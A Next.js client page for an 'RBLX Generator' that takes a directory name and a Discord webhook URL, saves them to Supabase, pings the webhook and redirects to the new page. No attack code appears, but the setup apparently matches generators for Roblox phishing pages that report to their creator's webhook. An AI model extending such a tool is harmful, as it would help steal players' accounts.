"use client";
import { useState } from "react";
import { supabase } from "../../supabaseClient";

export default function GeneratorPage() {
  const [directory, setDirectory] = useState("");
  const [webhook, setWebhook] = useState("");
  const [status, setStatus] = useState("");

  const handleGenerate = async () => {
    if (!directory || !webhook) {
      setStatus("⚠️ Please enter both a directory and webhook URL");
      return;
    }

    // Validate directory name (alphanumeric and hyphens only)
    if (!/^[a-zA-Z0-9-]+$/.test(directory)) {
      setStatus("❌ Directory name can only contain letters, numbers, and hyphens");
      return;
    }

    setStatus("⏳ Creating site...");

    try {
      // Insert new record in Supabase
      const { data, error } = await supabase
        .from("websites")
        .insert([{ directory, webhook_url: webhook }]);

      if (error) {
        if (error.code === '23505') { // Unique violation
          setStatus("❌ Directory name already exists");
        } else {
          setStatus("❌ Error: " + error.message);
        }
        return;
      }

      // Send Discord webhook message
      try {
        await fetch(webhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: `✅ Your site **${directory}** has been successfully created!\n🌐 Visit it here: ${window.location.origin}/${directory}`,
          }),
        });
      } catch (err) {
        console.error("Webhook send failed", err);
      }

      setStatus("✅ Site created successfully! Redirecting...");

      // Redirect user to their page
      setTimeout(() => {
        window.location.href = `/${directory}`;
      }, 1500);

    } catch (error) {
      setStatus("❌ Unexpected error occurred");
      console.error(error);
    }
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-br from-blue-500 to-purple-600 text-white p-4">
      <h1 className="text-3xl font-bold mb-6">🌐 RBLX Generator</h1>
      
      <a 
        href="/"
        className="mb-6 bg-white/20 text-white px-6 py-2 rounded-lg hover:bg-white/30 transition"
      >
        ← Back to Home
      </a>

      <div className="bg-white/10 backdrop-blur-lg p-6 rounded-2xl shadow-xl w-full max-w-md flex flex-col gap-4">
        <input
          value={directory}
          onChange={(e) => setDirectory(e.target.value)}
          placeholder="Enter directory name"
          className="px-4 py-3 rounded-lg bg-white/20 text-white placeholder-gray-300 border border-white/20 focus:border-white/40 focus:outline-none"
        />
        <input
          value={webhook}
          onChange={(e) => setWebhook(e.target.value)}
          placeholder="Enter Discord Webhook URL"
          className="px-4 py-3 rounded-lg bg-white/20 text-white placeholder-gray-300 border border-white/20 focus:border-white/40 focus:outline-none"
        />
        <button
          onClick={handleGenerate}
          className="bg-white text-blue-700 font-semibold px-4 py-3 rounded-lg hover:bg-blue-200 transition disabled:opacity-50 disabled:cursor-not-allowed"
          disabled={!directory || !webhook}
        >
          Generate
        </button>

        {status && (
          <p className={`text-center mt-2 ${
            status.includes('❌') ? 'text-red-300' : 
            status.includes('⚠️') ? 'text-yellow-300' : 'text-green-300'
          }`}>
            {status}
          </p>
        )}
      </div>
    </div>
  );
        }
